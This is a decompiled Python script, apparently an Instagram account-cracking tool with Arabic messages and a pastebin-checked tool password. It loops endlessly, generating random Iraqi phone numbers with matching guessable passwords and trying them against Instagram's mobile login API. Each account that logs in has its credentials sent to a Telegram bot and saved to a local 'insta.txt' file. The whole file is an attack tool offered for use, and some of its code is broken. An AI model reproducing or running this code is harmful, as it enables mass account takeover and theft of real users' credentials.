# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.9.6 (default, Jun 30 2021, 09:17:59) 
# [Clang 9.0.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: string
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        Sidra = requests.get('https://pastebin.com/raw/P2VThG6a')
        password = input('          TOOL PASSWORD: ')
        if password == '':
            sys.exit()
        elif password in str(Sidra.text):
            print(' FIRST STEP Is Done. Logged in Successfully as ')
            print('Please Wait 5 Minutes, All Packages Are Checking.....')
        else:
            print(' انتـهت الفتره المجاني راسل المطور للـتفعيـل @FFF0FFFF')
            sys.exit()
        os.system('clear')
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        webbrowser.open('https://t.me/JJ9MJ')
        print(E + '[' + S + '!' + E + ']' + G + ' ID𐇭 ')
        print('\n')
        ID = input(S + '  E𝒏𝒕𝒆𝒓𖤷 𝗜𝗗  →   ')
        print('\n')
        sleep(1)
        token = input(' - 𝐟𝐧𝐭𝐞𝐫 Y𝐨𝐮𝐫 T𝐨𝐤𝐞𝐧 B𝐨𝐭۩ : ')
        w = 'https://pastebin.com/raw/xPfV5eKD'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=انتضر جاري الفحص..... ✅@FFF0FFFF").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'KEBO' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+964770' + us
            password = '0770' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=حـسـاب انـسـتـا ✅ .\n✓\n 𝗨𝗦𝗘𝗥 : {username}\n 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 : {password}\n- "
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= -  𝐀𝐁𝐒 𖡮 @FFF0FFFF  \n 𝐀𝐁𝐒 𖡮 ✅  [{zz}]] \n------------------------------------------\n 𝐅𝐫𝐎𝐦 ❌[{aa} ( {username} ) \n 𝐓𝐄𝐋𝐄 → @JJ9MJ | @CXSXS🚸")
                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                aa += 1

        print('راسل المطور ')
        print('معرف المطورين')
        print('@FFF0FFFF')
